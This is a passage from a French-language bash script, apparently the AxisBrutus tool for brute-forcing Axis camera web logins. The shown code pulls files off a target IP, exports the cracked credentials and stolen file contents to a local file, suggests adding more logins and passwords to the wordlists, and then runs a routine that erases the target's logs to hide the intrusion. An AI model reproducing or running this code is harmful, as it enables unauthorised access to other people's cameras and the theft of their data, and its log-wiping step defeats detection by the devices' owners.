		echo -e "$jaune[+] Fichier: "$(afficherBarre "$no_fichier" "$nb_fichiers_a_voler")"$jaune [$cyan$fichier_x$jaune]"
		voleFichier $ip $fichier_x > $temp_vole
		#echo -e "$jaune[+] FICHIER:$cyan $fichier_x:"
		if [ "$modeVerbose" = 'OUI' ]; then
			echo -e "$vert--------------------------------------------------------------$italic$vert_fonce"
			cat $temp_vole
			echo -e "$vert--------------------------------------------------------------$reset"
		fi
		#export
		export_donnes=$export_donnes"\n$fichier_x:"
		export_donnes=$export_donnes"\n--------------------------------------------------------------"
		while read ligne_fic; do
			export_donnes=$export_donnes"\n"$ligne_fic""
		done < $temp_vole
		export_donnes=$export_donnes"\n--------------------------------------------------------------\n\n"

	done;

	tput cuu1;tput el
	echo -e "$jaune[+] Fichier:$cyan Terminé!"
		

	echo -e "$reset"
fi

####################################################################################################################
#                                            EXPORT DES DONNES
####################################################################################################################
if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'SAUVEGARDE/EXPORT:'$reset
	logMessage "Export des données : $export_destination" "INFORMATION"
	echo -en "$jaune[+] En cours..."

	echo -e $banniere_export|base64 -d > $export_destination
	echo -e " $ab_web\t \t AxisBrutus Ver. $ab_ver" >> $export_destination
	echo -e "-------------------------------------------------------------------------------" >> $export_destination
	echo -e "\n$export_donnes" >> $export_destination
	echo -e "-------------------------------------------------------------------------------" >> $export_destination
	echo -e " $ab_auteur  -  $ab_contact  -  $ab_web" >> $export_destination
	echo -e "$cyan terminé!"
fi
####################################################################################################################
#                                                      RESUME
####################################################################################################################
if [ "$checkOnly" != "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'RESUME:'$reset
	if [ "$mdp_trouve" = "OUI" ]; then
		echo -e "$jaune[+] BRAVO:$cyan On l'a trouvé en $vert$total_fait$cyan essais!"
		echo -e "$jaune[+] EXPORT:$cyan Les informations d'identification ont été stockées ici : $vert$export_destination"
	else
			if [ "$echec_js" = "OUI" ]; then		
				echo -e "$jaune[+] M****:$cyan Cette interface web axis nécessite javascript. $jaune_fonce:'("
				echo -e "$jaune[+] INFO:$cyan Version javascript en cours de dev $jaune_fonce;)"
			else
				echo -e "$jaune[+] M****:$cyan $total_fait essais sans trouver $jaune_fonce:'("
				echo -e "$jaune[+] ASTUCE:$cyan Ajoute des logins et des mdp aux fichiers wordlist $jaune_fonce;)"
			fi
	fi
	echo -e "$jaune[+] DUREE:$cyan $duree_totale"
fi


####################################################################################################################
#                                              EFFACER LES TRACES/LOGS
####################################################################################################################

if [ "$mdp_trouve" = "OUI" ]; then
	echo -e "$jaune_fonce\n$souligne"'EFFACER LES TRACES/LOGS:'$reset
	logMessage "Effacement des logs" "INFORMATION"
	echo -en "$jaune[+] En cours..."
	#effacer les traces 
	effacerTraces $ip 

	echo -e "$cyan terminé!"
fi
####################################################################################################################
#                                                        END
####################################################################################################################

logMessage "Terminé : Durée $duree_totale" "INFORMATION"

echo -e $reset
exit
